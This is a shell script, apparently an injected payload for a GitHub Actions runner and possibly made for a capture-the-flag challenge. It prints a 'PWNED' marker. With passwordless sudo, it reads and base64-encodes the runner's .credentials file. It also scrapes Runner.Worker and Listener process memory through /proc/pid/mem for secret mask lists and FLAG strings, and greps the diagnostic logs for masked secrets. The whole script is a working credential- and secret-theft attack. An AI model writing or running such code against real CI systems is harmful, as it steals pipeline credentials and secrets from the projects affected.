#!/bin/sh
echo "===PWNED-lazyhacker6-RCE-V6==="
echo "job=${GITHUB_JOB:-} ref=${GITHUB_REF:-} sha=${GITHUB_SHA:-}"
id 2>/dev/null || true
if sudo -n true 2>/dev/null; then
  echo "sudo=yes"
  echo "--- runner dir ---"
  sudo ls -la /home/runner/actions-runner 2>/dev/null | head -25
  echo "--- runner credentials ---"
  sudo sh -c 'cat /home/runner/actions-runner/.credentials 2>/dev/null | base64 -w0' | head -c 2000; echo
  echo "--- worker pids ---"
  sudo sh -c 'ps -eo pid,user,comm,args 2>/dev/null | grep -iE "Runner|node" | head -10'
  echo "--- mask list in memory ---"
  sudo sh -c 'for pid in $(pgrep -f "Runner.Worker|Runner.Listener" 2>/dev/null); do echo "pid=$pid"; timeout 60 grep -ao "\"Mask\":\[[^]]\{0,2000\}\]" /proc/$pid/mem 2>/dev/null | head -2 | base64 -w0; echo; done' || true
  echo "--- FLAG in memory (raw + b64) ---"
  sudo sh -c 'for pid in $(pgrep -f "Runner.Worker|Runner.Listener" 2>/dev/null); do timeout 60 grep -ao "FLAG{[^}]*}" /proc/$pid/mem 2>/dev/null | head -3 | base64 -w0; echo; done' || true
  echo "--- diag grep mask/secret ---"
  sudo sh -c 'timeout 45 grep -raho "\"Mask\":\[[^]]\{0,500\}\]" /home/runner/actions-runner/_diag 2>/dev/null | head -2 | base64 -w0' || true
  echo
else
  echo "sudo=no"
fi
echo "===PWNED-lazyhacker6-V6-END==="
exit 1
